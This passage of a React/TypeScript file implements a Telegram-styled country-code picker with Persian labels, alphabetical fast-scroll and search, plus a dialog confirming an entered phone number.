  const grouped = useMemo(() => groupCountries(searchCountries('')), []);
  const searchResults = useMemo(() => (query.trim() ? searchCountries(query) : []), [query]);
  const letters = useMemo(() => grouped.map((group) => group.letter), [grouped]);

  const pick = (country: TelegramCountry) => {
    onSelect(country);
    closeHistoryOverlay();
  };

  const filtered = query.trim();

  const jumpToLetter = (letter: string) => {
    const list = listRef.current;
    const section = sectionRefs.current[letter];

    if (!list || !section) {
      return;
    }

    list.scrollTop += section.getBoundingClientRect().top - list.getBoundingClientRect().top;
    setActiveLetter(letter);
  };

  const clearFastScroll = () => {
    setActiveLetter(null);
    setBubbleY(null);
  };

  const onFastScroll = (event: PointerEvent<HTMLDivElement>) => {
    const bounds = event.currentTarget.getBoundingClientRect();
    const y = Math.min(bounds.height, Math.max(0, event.clientY - bounds.top));
    const index = Math.min(
      letters.length - 1,
      Math.max(0, Math.floor((y / bounds.height) * letters.length)),
    );
    jumpToLetter(letters[index]);
    setBubbleY(y);
  };

  return (
    <div className="tg-countries">
      <div className="tg-search-row">
        <span className="tg-search-icon">
          <SearchIcon />
        </span>
        <input
          className="tg-search"
          dir="rtl"
          value={query}
          placeholder="جستجو"
          onChange={(event) => setQuery(event.target.value)}
        />
      </div>

      <div className="tg-country-pane">
        <div ref={listRef} className="tg-country-list">
          {filtered ? (
            searchResults.length === 0 ? (
              <div className="tg-empty">نتیجه‌ای یافت نشد</div>
            ) : (
              searchResults.map((item) => (
                <CountryRow key={countryKey(item)} country={item} onSelect={pick} />
              ))
            )
          ) : (
            grouped.map((group, groupIndex) => (
              <div
                key={group.letter}
                ref={(node) => {
                  sectionRefs.current[group.letter] = node;
                }}
              >
                {group.items.map((item) => (
                  <CountryRow key={countryKey(item)} country={item} onSelect={pick} />
                ))}
                {groupIndex < grouped.length - 1 ? <div className="tg-section-line" /> : null}
              </div>
            ))
          )}
        </div>

        {!filtered && letters.length > 1 ? (
          <div
            className="tg-fastscroll"
            onPointerDown={(event) => {
              event.currentTarget.setPointerCapture(event.pointerId);
              onFastScroll(event);
            }}
            onPointerMove={(event) => {
              if (event.buttons) {
                onFastScroll(event);
              }
            }}
            onPointerUp={clearFastScroll}
            onPointerCancel={clearFastScroll}
          >
            {letters.map((letter) => (
              <span
                key={letter}
                className={`tg-fastscroll-letter${activeLetter === letter ? ' is-on' : ''}`}
              >
                {letter}
              </span>
            ))}
            {activeLetter && bubbleY != null ? (
              <span className="tg-fastscroll-bubble" style={{ top: bubbleY }}>
                {activeLetter}
              </span>
            ) : null}
          </div>
        ) : null}
      </div>
    </div>
  );
}

function ConfirmLayer({
  number,
  fabIcon,
  onYes,
  onClose,
}: {
  number: string;
  fabIcon: FabIcon;
  onYes: () => void;
  onClose: () => void;
}) {
  useHistoryOverlay(onClose);

  return (
    <>
      <div className="tg-overlay" onClick={closeHistoryOverlay} />
      <div className="tg-dialog" style={{ bottom: 14 + 230 + 56 + 32 }}>
        <div className="tg-dialog-q">آیا این شماره درست است؟</div>
        <div className="tg-dialog-n">{number}</div>
        <div className="tg-dialog-actions">
          <button type="button" className="tg-dialog-btn" onClick={onYes}>
            بله
          </button>
          <button type="button" className="tg-dialog-btn" onClick={closeHistoryOverlay}>
            ویرایش
          </button>
        </div>
      </div>
      <button
        type="button"
        className="tg-fab"
        aria-label="تأیید"
        onClick={onYes}
        style={{ zIndex: 8 }}
      >
        {fabIcon === 'progress' ? <SpinnerIcon /> : <CheckIcon />}
      </button>
    </>
  );
}

function CountryRow({
  country,
  onSelect,
}: {
  country: TelegramCountry;
  onSelect: (country: TelegramCountry) => void;
}) {
  return (
    <button type="button" className="tg-row" onClick={() => onSelect(country)}>
      <span className="tg-row-name">
        <Flag iso={country.iso} />
        <span>{country.nameFa}</span>
      </span>
      <span className="tg-row-code">+{country.code}</span>
    </button>
  );
}
